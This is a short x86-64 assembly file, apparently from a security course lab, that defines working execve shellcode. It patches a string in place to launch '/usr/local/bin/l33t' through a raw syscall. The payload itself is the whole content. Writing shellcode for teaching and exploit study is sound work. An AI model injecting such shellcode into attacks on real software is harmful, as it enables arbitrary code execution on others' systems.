.data
.globl shellcode
shellcode:  
	jmp over_string
string_addr:  
	.ascii "/usr/local/bin/l33tNAAAAAAAABBBBBBBB"
over_string:  
	leaq string_addr(%rip), %rdi  
	xorl %eax,  %eax  
	movb %al,   0x13(%rdi) 
	movq %rdi,  0x14(%rdi)  
	movq %rax,  0x1c(%rdi)  
	leaq 0x14(%rdi), %rsi  
	movq %rax,  %rdx  
	movb $0x3b, %al  
	syscall  
	.byte 0

